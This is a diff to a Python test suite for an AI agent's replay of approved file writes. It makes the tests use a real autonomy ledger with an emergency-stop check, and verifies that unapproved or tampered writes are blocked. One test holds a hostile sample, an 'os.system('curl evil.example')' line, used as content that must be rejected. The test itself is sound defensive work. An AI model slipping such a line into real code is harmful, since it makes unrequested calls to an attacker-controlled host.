@@ -24,6 +24,14 @@ from aios.core.replay_writes import record_approval, store_content
 from aios.memory.db import init_memory_db
 from aios.security import scope_lock
 
+
+class _ClearStop:
+    """A latch that is wired and not engaged."""
+
+    def assert_operational(self):
+        return None
+
+
 _CONTENT = "def add(a, b):\n    return a + b\n"
 _DIGEST = hashlib.sha256(_CONTENT.encode("utf-8")).hexdigest()
 
@@ -119,7 +127,7 @@ def test_nothing_is_offered_when_the_content_was_never_stored(
 # --------------------------------------------------------------------------- #
 
 
-def _agent(sandbox: Path, autonomy=None):
+def _agent(sandbox: Path, db_path: Path, autonomy=None):
     from aios.agents.tool_agent import ToolAgent
     from aios.core.executor import Executor
 
@@ -132,7 +140,14 @@ def _agent(sandbox: Path, autonomy=None):
         Executor(runner=_Runner(), audit_log=lambda *a, **k: None),
         read_root=sandbox,
     )
-    agent.autonomy = autonomy
+    # Default to a REAL ledger with a clear stop. Passing `None` used to make
+    # every authorisation skip the emergency-stop check, so these tests passed
+    # while proving nothing about it.
+    agent.autonomy = (
+        autonomy
+        if autonomy is not None
+        else AutonomyLedger(db_path=db_path, emergency_stop=_ClearStop())
+    )
     return agent
 
 
@@ -146,7 +161,7 @@ def test_a_replayed_write_without_an_approval_is_blocked(db_path, sandbox, monke
     monkeypatch.setattr(config, "MEMORY_DB_PATH", db_path)
     monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)
 
-    output, status, _ = _agent(sandbox)._replay_create_file(
+    output, status, _ = _agent(sandbox, db_path)._replay_create_file(
         {"filepath": "util.py", "content": _CONTENT, "content_sha256": _DIGEST}
     )
 
@@ -173,7 +188,7 @@ def test_an_earned_glob_does_not_authorise_a_replayed_write(
     monkeypatch.setattr(config, "MEMORY_DB_PATH", db_path)
     monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)
 
-    output, status, _ = _agent(sandbox, autonomy=ledger)._replay_create_file(
+    output, status, _ = _agent(sandbox, db_path, autonomy=ledger)._replay_create_file(
         {"filepath": "util.py", "content": _CONTENT, "content_sha256": _DIGEST}
     )
 
@@ -189,7 +204,7 @@ def test_an_approved_write_is_replayed_with_the_approved_bytes(
     monkeypatch.setattr(config, "MEMORY_DB_PATH", db_path)
     monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)
 
-    _, status, failed = _agent(sandbox)._replay_create_file(
+    _, status, failed = _agent(sandbox, db_path)._replay_create_file(
         {"filepath": "util.py", "content": _CONTENT, "content_sha256": _DIGEST}
     )
 
@@ -205,7 +220,7 @@ def test_bytes_that_differ_from_the_approval_are_blocked(db_path, sandbox, monke
     monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)
 
     tampered = "def add(a, b):\n    return a - b\n"
-    _, status, _ = _agent(sandbox)._replay_create_file(
+    _, status, _ = _agent(sandbox, db_path)._replay_create_file(
         {
             "filepath": "util.py",
             "content": tampered,
@@ -231,7 +246,7 @@ def test_a_digest_that_does_not_match_its_content_cannot_smuggle_bytes(
     monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)
 
     evil = "import os\nos.system('curl evil.example')\n"
-    _, status, _ = _agent(sandbox)._replay_create_file(
+    _, status, _ = _agent(sandbox, db_path)._replay_create_file(
         {"filepath": "util.py", "content": evil, "content_sha256": _DIGEST}
     )
 
